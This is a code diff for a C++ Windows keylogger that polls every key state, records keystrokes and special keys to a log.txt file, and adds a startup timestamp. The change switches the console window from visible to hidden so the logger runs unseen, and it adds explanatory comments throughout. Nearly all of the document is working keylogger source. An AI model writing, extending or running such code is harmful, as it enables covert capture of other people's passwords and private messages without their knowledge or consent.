@@ -1,27 +1,33 @@
 #include <Windows.h>
 #include <iostream>
-#include <string>
 #include <fstream>
+#include <chrono>
+#include <ctime>
 using namespace std;
 
-
+// Function Prototypes
 template <class T>
 void writeToFile(T input);
-
 bool specialKeys(int S_Key);
-
-
+void logTime();
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_NORMAL);
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_NORMAL);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+	// To write the time at startup to the log.txt file
+	logTime();
 
 	while (true)
 	{
-		Sleep(10);
+		// 5ms delay
+		Sleep(5);
+
+		// Checks all the keys to see which one is pressed
 		for (int KEY = 1; KEY <= 222; KEY++)
 		{
+			// GetAsyncKeyState() determines whether a key is pressed or not.
 			if (GetAsyncKeyState(KEY) == -32767)
 			{
 				cout << KEY;
@@ -36,6 +42,12 @@ int main()
 	return 0;
 }
 
+/*
+	Method: writeToFile(T input)
+	Parameters: input - represents the the character or string that is going to be written into the file
+	Return Values: None
+	Purpose: To save the user's written characters and special actions into the log.txt file
+*/
 template <class T>
 void writeToFile(T input)
 {
@@ -48,6 +60,12 @@ void writeToFile(T input)
 	}
 }
 
+/*
+	Method: specialKeys(int specialKey)
+	Parameters: specialKey - represents the virtual-key code used by the system
+	Return Values: true - if the virtual-key code is a special key; false - if the virtual-key code is not a special key
+	Purpose: To write special keys into the log.txt file if found.
+*/
 bool specialKeys(int specialKey)
 {
 	switch (specialKey)
@@ -348,32 +366,26 @@ bool specialKeys(int specialKey)
 			writeToFile(".");
 			return true;
 		case VK_OEM_2:
-			// fix
 			cout << "/";
 			writeToFile("/");
 			return true;
 		case VK_OEM_3:
-			// fix
 			cout << "`";
 			writeToFile("`");
 			return true;
 		case VK_OEM_4:
-			// fix
 			cout << "[";
 			writeToFile("[");
 			return true;
 		case VK_OEM_5:
-			// fix
 			cout << "\\";
 			writeToFile("\\");
 			return true;
 		case VK_OEM_6:
-			// fix
 			cout << "]";
 			writeToFile("]");
 			return true;
 		case VK_OEM_7:
-			// fix
 			cout << "'";
 			writeToFile("'");
 			return true;
@@ -381,4 +393,20 @@ bool specialKeys(int specialKey)
 		default:
 			return false;
 	}
+}
+
+/*
+	Method: logTime()
+	Parameters: None
+	Return Values: None
+	Purpose: To write the current time to the log.txt file
+*/
+void logTime()
+{
+	char time[30];
+	auto currentTime = chrono::system_clock::to_time_t(chrono::system_clock::now());
+	ctime_s(time, sizeof(time), &currentTime);
+	writeToFile("\n========================\n");
+	writeToFile(time);
+	writeToFile("========================\n");
 }
